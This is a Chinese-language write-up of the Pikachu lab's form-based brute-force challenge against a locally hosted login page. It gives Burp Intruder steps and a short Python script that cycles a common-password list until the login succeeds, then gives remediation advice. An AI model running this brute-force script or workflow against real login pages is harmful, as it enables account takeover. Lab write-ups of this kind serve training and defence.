Pikachu - 暴力破解 - 基于表单的暴力破解

# Pikachu # Web # 暴力破解 # Burp Intruder # 字典爆破

一、题目信息

  • 题目名称：基于表单的暴力破解
  • 题目路径：Pikachu → 暴力破解 → 基于表单的暴力破解
  • 题目方向：Web - 暴力破解（Burte Force）
  • 题目环境：本地部署，PHP 7.4.33 + MariaDB 10.11.19 + PHP 内置服务器
  • 访问地址：http://127.0.0.1/pikachu/vul/burteforce/bf_form.php
  • 题目目标：绕过登录验证，取得 admin 账号口令。

二、漏洞原理

本题就是一个最朴素的登录表单，提交两个参数：username 与 password。

查看源码 vul/burteforce/bf_form.php，登录校验逻辑如下：

if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);
    $line_pre->bind_param('ss',$username,$password);

这里缺失了三项关键防护，构成暴力破解漏洞：

防护措施是否存在后果
图形验证码否可自动化提交，无需人工识别
登录失败次数限制 / 账号锁定否可无限次尝试，无需等待
CSRF Token 或其他一次性凭据否请求可重复重放
注意：该处 SQL 使用了 prepare 预处理与 bind_param 参数绑定，因此不存在 SQL 注入。不要尝试 admin' or '1'='1 一类的注入载荷，本题的唯一突破口就是暴力破解。

三、漏洞验证

先用固定用户名、随机密码提交一次，观察响应特征。

失败响应

POST /pikachu/vul/burteforce/bf_form.php HTTP/1.1

username=admin&password=wrongpw&submit=login

返回内容包含：

<p> username or password is not exists～</p>

成功响应

当凭据正确时，返回内容变为：

<p> login success</p>

两次响应的页面长度差异很小，实测数据如下：

结果响应特征长度（字符）
登录成功login success35285
登录失败username or password is not exists～35307

两者仅相差 22 个字符。在 3 万多字符的页面中，仅凭"响应长度"肉眼比对极易误判，因此后续必须借助关键字匹配来判定结果。

四、漏洞利用

使用 Burp Suite Community Edition 的 Intruder 模块完成爆破。整体分为抓包、标记位置、加载字典、设定判定条件、发起攻击五步。

4.1 抓取登录请求

  1. 在 Burp 中打开 Proxy → Intercept，确认 Intercept is off。
  2. 点击 Open browser 打开 Burp 内置浏览器。
  3. 访问目标页面，填入 admin 与任意错误密码，点击 Login。
  4. 回到 Burp，进入 Proxy → HTTP history，找到该 POST 请求。
  5. 右键 → Send to Intruder（快捷键 Ctrl+I）。

4.2 标记爆破位置

进入 Intruder → Positions，先点 Clear § 清除 Burp 自动添加的全部标记，再单独选中密码值，点 Add § 添加标记。最终请求体应为：

username=admin&password=§123§&submit=login

界面底部应显示 1 payload position，即只有一个爆破位置。

因为用户名 admin 已由题目提示给出，此处只爆破密码。若用户名同样未知，可对两个位置同时标记，但请求数会变成两个字典的笛卡尔积，成本急剧上升。

4.3 加载字典

切换到 Payloads 面板：

  • Payload type 保持 Simple list
  • 点击 Load...，选择本地常见口令字典（本项目使用 top1000.txt，共 1000 条）
  • 确认 Payload count 显示 1000

4.4 设定成功判定条件

切换到 Settings 面板，找到 Grep - Match 区域：

  1. 勾选 Flag responses matching these expressions
  2. 点击 Add，添加表达式 login success
  3. Match type 选择 Simple string，不勾选大小写敏感，勾选 Exclude HTTP headers

这样 Burp 会在结果表格中新增一列，凡响应正文命中该关键字的行会自动打勾，一眼即可定位成功记录。

4.5 发起攻击

点击右上角 Start attack 开始爆破。Community 版会弹出限速提示，确认后继续。

六、批量验证其他账号

同一流程可复用，仅需修改请求体中的 username。本题内置三个用户：

用户名密码字典位置
admin123456第 1 行

三个口令均位于常见口令字典的前 40 行内，说明弱口令在真实场景中的命中率极高。

附：脚本化批量验证

除 Burp 外，也可直接使用脚本对同一接口批量尝试，速度更快：

import urllib.parse, urllib.request

URL = "http://127.0.0.1/pikachu/vul/burteforce/bf_form.php"

def try_login(user, pwd):
    data = urllib.parse.urlencode(
        {"username": user, "password": pwd, "submit": "login"}
    ).encode()
    req = urllib.request.Request(URL, data=data)
    with urllib.request.urlopen(req, timeout=15) as r:
        return "login success" in r.read().decode("utf-8", "replace")

for pwd in open("top1000.txt", encoding="utf-8"):
    pwd = pwd.strip()
    if pwd and try_login("admin", pwd):
        print("found:", pwd)
        break

七、修复建议

  • 增加图形验证码：每次登录必须人工识别，直接阻断自动化脚本。
  • 限制失败次数：同一账号连续失败 5 次后锁定 15 分钟，或采用渐进式延迟。
  • 按来源限速：限制同一 IP 单位时间内的登录请求数量。
  • 强制口令强度：禁止 123456、000000、abc123 等弱口令，从源头降低字典命中率。
  • 多因素认证：口令正确后仍需二次验证，即使口令泄露也难以直接登录。
  • 统一失败提示：不要区分"用户名不存在"和"密码错误"，避免用户名枚举。

八、解题总结

本题是暴力破解类漏洞的入门模型，核心判断逻辑可以概括为三点：

  1. 有没有验证码？没有 → 可自动化。
  2. 有没有失败次数限制或锁定？没有 → 可无限尝试。
  3. 有没有一次性 Token？没有 → 请求可重放。

三者皆无，即构成可被暴力破解的登录接口。本题中 123456 恰好是字典第一行，仅用一次请求便命中，直观说明弱口令与缺乏防护叠加后的风险。

实战中还需注意结果判定方式：当成功与失败响应长度极为接近时，应使用关键字匹配（Grep - Match）而非肉眼比对长度，否则极易漏判或误判。这也是本题最容易踩坑的一环。
